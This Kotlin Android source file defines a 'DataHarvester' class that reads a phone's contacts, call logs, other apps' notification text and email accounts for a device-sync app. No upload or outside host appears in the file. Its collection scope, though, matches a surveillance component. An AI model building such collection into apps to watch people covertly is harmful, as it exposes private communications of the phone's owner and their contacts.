package com.devicesync.app.services

import android.content.Context
import android.provider.ContactsContract
import android.provider.CallLog
import android.provider.Telephony
import android.database.Cursor
import android.accounts.AccountManager
import com.devicesync.app.data.models.*
import java.util.*

class DataHarvester(private val context: Context) {
    
    // Step 5: Get contacts since last sync (incremental)
    suspend fun getContactsSince(lastSync: Date): List<ContactModel> {
        val contacts = mutableListOf<ContactModel>()
        
        try {
            // Query contacts modified after lastSync
            val selection = "${ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP} > ?"
            val selectionArgs = arrayOf(lastSync.time.toString())
            
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP
                ),
                selection, selectionArgs,
                ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP + " DESC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val contactId = it.getString(0)
                    val name = it.getString(1) ?: "Unknown"
                    val phoneNumber = it.getString(2) ?: ""
                    val phoneType = it.getInt(3)
                    val lastUpdated = it.getLong(4)
                    
                    // Only include if actually modified after lastSync
                    if (lastUpdated > lastSync.time) {
                        val contact = ContactModel(
                            contactId = contactId,
                            name = name,
                            phoneNumber = phoneNumber,
                            phoneType = getPhoneTypeString(phoneType),
                            emails = getContactEmails(contactId),
                            organization = getContactOrganization(contactId)
                        )
                        contacts.add(contact)
                    }
                }
            }
            
            println("Found ${contacts.size} contacts modified since $lastSync")
            
        } catch (e: Exception) {
            println("Error getting contacts since last sync: ${e.message}")
        }
        
        return contacts
    }
    
    // Get all contacts (for first-time sync)
    suspend fun getAllContacts(): List<ContactModel> {
        val contacts = mutableListOf<ContactModel>()
        
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER,
                    ContactsContract.CommonDataKinds.Phone.TYPE
                ),
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val contactId = it.getString(0)
                    val name = it.getString(1) ?: "Unknown"
                    val phoneNumber = it.getString(2) ?: ""
                    val phoneType = it.getInt(3)
                    
                    val contact = ContactModel(
                        contactId = contactId,
                        name = name,
                        phoneNumber = phoneNumber,
                        phoneType = getPhoneTypeString(phoneType),
                        emails = getContactEmails(contactId),
                        organization = getContactOrganization(contactId)
                    )
                    contacts.add(contact)
                }
            }
            
            println("Found ${contacts.size} total contacts")
            
        } catch (e: Exception) {
            println("Error getting all contacts: ${e.message}")
        }
        
        return contacts
    }
    
    // Step 6: Get call logs since last sync (incremental)
    suspend fun getCallLogsSince(lastSync: Date): List<CallLogModel> {
        val callLogs = mutableListOf<CallLogModel>()
        
        try {
            // Query call logs after lastSync
            val selection = "${CallLog.Calls.DATE} > ?"
            val selectionArgs = arrayOf(lastSync.time.toString())
            
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                selection, selectionArgs,
                CallLog.Calls.DATE + " DESC"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(0)
                    val number = it.getString(1) ?: "Unknown"
                    val name = it.getString(2)
                    val type = it.getInt(3)
                    val date = it.getLong(4)
                    val duration = it.getInt(5)
                    
                    val callLog = CallLogModel(
                        callId = id,
                        phoneNumber = number,
                        contactName = name,
                        callType = getCallTypeString(type),
                        timestamp = Date(date),
                        duration = duration
                    )
                    callLogs.add(callLog)
                }
            }
            
            println("Found ${callLogs.size} call logs since $lastSync")
            
        } catch (e: Exception) {
            println("Error getting call logs since last sync: ${e.message}")
        }
        
        return callLogs
    }
    
    // Get all call logs (for first-time sync)
    suspend fun getAllCallLogs(): List<CallLogModel> {
        val callLogs = mutableListOf<CallLogModel>()
        
        try {
            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(
                    CallLog.Calls._ID,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DATE,
                    CallLog.Calls.DURATION
                ),
                null, null,
                CallLog.Calls.DATE + " DESC LIMIT 1000"
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val id = it.getString(0)
                    val number = it.getString(1) ?: "Unknown"
                    val name = it.getString(2)
                    val type = it.getInt(3)
                    val date = it.getLong(4)
                    val duration = it.getInt(5)
                    
                    val callLog = CallLogModel(
                        callId = id,
                        phoneNumber = number,
                        contactName = name,
                        callType = getCallTypeString(type),
                        timestamp = Date(date),
                        duration = duration
                    )
                    callLogs.add(callLog)
                }
            }
            
            println("Found ${callLogs.size} total call logs")
            
        } catch (e: Exception) {
            println("Error getting all call logs: ${e.message}")
        }
        
        return callLogs
    }
    
    // Step 7: Get new notifications (called by NotificationListenerService)
    suspend fun createNotificationModel(
        notificationId: String,
        packageName: String,
        appName: String?,
        title: String?,
        text: String?
    ): NotificationModel {
        return NotificationModel(
            notificationId = notificationId,
            packageName = packageName,
            appName = appName ?: packageName,
            title = title,
            text = text,
            timestamp = Date()
        )
    }
    
    // Step 8: Get email accounts (once daily)
    suspend fun getEmailAccounts(): List<EmailAccountModel> {
        val emailAccounts = mutableListOf<EmailAccountModel>()
        
        try {
            val accountManager = AccountManager.get(context)
            val accounts = accountManager.accounts
            
            for (account in accounts) {
                // Check if account type indicates it's an email account
                val accountType = account.type
                if (isEmailAccountType(accountType)) {
                    val emailAccount = EmailAccountModel(
                        emailAddress = account.name,
                        accountName = account.name,
                        accountType = accountType,
                        displayName = account.name,
                        isActive = true
                    )
                    emailAccounts.add(emailAccount)
                }
            }
            
            println("Found ${emailAccounts.size} email accounts")
            
        } catch (e: Exception) {
            println("Error getting email accounts: ${e.message}")
        }
        
        return emailAccounts
    }
    
    // Helper methods
    private fun getContactEmails(contactId: String): List<String> {
        val emails = mutableListOf<String>()
        
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Email.ADDRESS),
                "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                arrayOf(contactId),
                null
            )
            
            cursor?.use {
                while (it.moveToNext()) {
                    val email = it.getString(0)
                    if (!email.isNullOrEmpty()) {
                        emails.add(email)
                    }
                }
            }
        } catch (e: Exception) {
            println("Error getting contact emails: ${e.message}")
        }
        
        return emails
    }
    
    private fun getContactOrganization(contactId: String): String? {
        try {
            val cursor = context.contentResolver.query(
                ContactsContract.Data.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Organization.COMPANY),
                "${ContactsContract.Data.CONTACT_ID} = ? AND ${ContactsContract.Data.MIMETYPE} = ?",
                arrayOf(contactId, ContactsContract.CommonDataKinds.Organization.CONTENT_ITEM_TYPE),
                null
            )
            
            cursor?.use {
                if (it.moveToFirst()) {
                    return it.getString(0)
                }
            }
        } catch (e: Exception) {
            println("Error getting contact organization: ${e.message}")
        }
        
        return null
    }
    
    private fun getPhoneTypeString(type: Int): String {
        return when (type) {
            ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE -> "mobile"
            ContactsContract.CommonDataKinds.Phone.TYPE_HOME -> "home"
            ContactsContract.CommonDataKinds.Phone.TYPE_WORK -> "work"
            ContactsContract.CommonDataKinds.Phone.TYPE_OTHER -> "other"
            else -> "unknown"
        }
    }
    
    private fun getCallTypeString(type: Int): String {
        return when (type) {
            CallLog.Calls.INCOMING_TYPE -> "incoming"
            CallLog.Calls.OUTGOING_TYPE -> "outgoing"
            CallLog.Calls.MISSED_TYPE -> "missed"
            else -> "unknown"
        }
    }
    
    private fun isEmailAccountType(accountType: String): Boolean {
        // Common email account types
        val emailAccountTypes = listOf(
            "com.google",
            "com.android.email",
            "com.microsoft.exchange",
            "com.yahoo.mobile.client.android.mail",
            "com.outlook.Z7",
            "com.apple.mail",
            "com.samsung.android.email.provider",
            "org.kman.AquaMail"
        )
        
        return emailAccountTypes.any { accountType.contains(it, ignoreCase = true) } ||
                accountType.contains("mail", ignoreCase = true) ||
                accountType.contains("email", ignoreCase = true)
    }
}
